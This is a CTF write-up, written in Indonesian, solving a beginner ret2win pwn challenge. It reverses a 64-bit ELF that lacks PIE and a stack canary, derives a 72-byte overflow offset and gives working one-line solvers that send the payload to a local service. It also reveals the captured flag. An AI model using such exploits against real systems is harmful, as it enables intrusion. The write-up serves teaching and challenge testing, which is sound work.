# Write-up — pwn_mavuika (blackbox test)

**Target:** `nc localhost 40201`
**Binary:** `mavuika` — ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped (symbol `win`/`vuln`/`main` masih kelihatan).

## 1. Recon

```
file mavuika
```
→ `ELF 64-bit LSB executable ... dynamically linked ... not stripped`

### checksec (manual, karena tool `checksec` tidak ada, dicek pakai `readelf`/`objdump`)

| Mitigasi | Status | Bukti |
|---|---|---|
| **NX** | ON | `GNU_STACK` segmen `RW` (tanpa flag `E`) |
| **PIE** | **OFF** | ELF header `Type: EXEC` (bukan `DYN`) → semua alamat fungsi statis |
| **Stack Canary** | **OFF** | tidak ada simbol/call ke `__stack_chk_fail` di disassembly |
| **RELRO** | Partial (ada segmen `GNU_RELRO`, tapi tidak krusial di exploit ini) |

Kombinasi **no PIE + no canary** = sinyal paling jelas: ini soal `ret2win` klasik, karena alamat fungsi bisa dihardcode tanpa leak, dan tidak ada canary yang perlu ditebak/dibypass.

## 2. Reversing (objdump, dibantu Binary Ninja via `/reversing-ninja`)

Karena binary tidak stripped, langsung kelihatan 3 fungsi relevan: `main`, `vuln`, `win`.

**`main()`** — inti logicnya:
```c
FILE *f = fopen("flag", "r");
if (!f) { puts("flag tidak ditemukan di server, lapor panitia..."); return 1; }
fgets(flag_buf /* 0x4040a0, global */, 0x100, f);
fclose(f);
vuln();
puts("selesai, tidak ada yang spesial.");
```
→ Flag sudah dibaca ke buffer **global** `flag` (0x4040a0) **sebelum** `vuln()` dipanggil. Artinya kita tidak perlu baca file sendiri — kita cukup memaksa program mencetak buffer itu.

**`vuln()`** — bug-nya di sini:
```c
void vuln(void) {
    char buf[64];           // local buffer, rbp-0x40
    printf("masukkan input: ");
    fflush(stdout);
    read(0, buf, 0x100);    // baca 256 byte ke buffer 64 byte!
}
```
`read()` membaca 256 byte ke buffer yang hanya 64 byte di stack → **classic stack buffer overflow**. Karena tidak ada canary, kita bisa langsung overwrite saved-RBP (8 byte) lalu **return address** (8 byte) tanpa hambatan apa pun.

**`win()`** — fungsi target:
```c
void win(void) {
    fputs(flag, stdout);   // cetak buffer global flag yang sudah diisi main()
    fflush(stdout);
    exit(0);
}
```
Alamat `win()` statis (no PIE): **`0x401256`**.

## 3. Eksploitasi

Offset dari awal buffer ke return address:
- `buf` di `rbp-0x40` → jarak ke saved-RBP = `0x40` = **64 byte**
- saved-RBP = **8 byte**
- total padding sampai return address = **72 byte**

Payload:
```
b"A" * 72 + p64(0x401256)
```
Dikirim lewat socket ke `vuln()` saat prompt `masukkan input: `. Saat `vuln()` melakukan `leave; ret`, return address yang sudah ditimpa membawa eksekusi lompat ke `win()`, yang langsung mencetak isi buffer `flag` global.

## 4. Hasil

```
masukkan input: TecFest26{love_of_you_is_my_most_cherished_thing_so_stay_alive_bravely}
```

Flag berhasil didapat tanpa scanning/fuzzing/brute force — murni analisis statis (file/checksec/objdump) + overflow 1-shot ret2win.

## 5. One-liner solver

Gaya pwntools (kalau `pwn` kepasang & ada `nc`):
```bash
python3 -c "from pwn import *; print((b'A'*72+p64(0x401256)).decode('latin1'))" | nc localhost 40201
```

Versi pure-Python (tanpa pwntools/nc, dicoba & jalan di environment ini — install pwntools gagal di Python 3.14 Windows karena build wheel `unicorn` error):
```bash
python3 -c "import socket,struct,time; s=socket.create_connection(('localhost',40201)); s.recv(4096); s.sendall(b'A'*72+struct.pack('<Q',0x401256)+b'\n'); time.sleep(0.3); print(s.recv(4096).decode())"
```

> Catatan: binary sempat di-update Sanca (hash/BuildID berubah), tapi disassembly `vuln()`/`win()` identik 1:1 dengan versi sebelumnya — offset 72 byte & alamat `win()` 0x401256 tetap sama, sudah diverifikasi ulang terhadap service yang jalan sekarang.

## 6. Catatan untuk Sanca

- Soal ini valid sebagai entry-level pwn (ret2win, no PIE, no canary) — cocok kalau memang ditujukan untuk kategori pemula/warm-up. Kalau niatnya soal lebih sulit, pertimbangkan nyalakan PIE dan/atau canary supaya peserta perlu leak alamat dulu.
- Pesan error "flag tidak ditemukan di server, lapor panitia..." mengandalkan file `flag` ada di cwd proses server — pastikan deployment production selalu menaruh file `flag` di working directory yang benar.
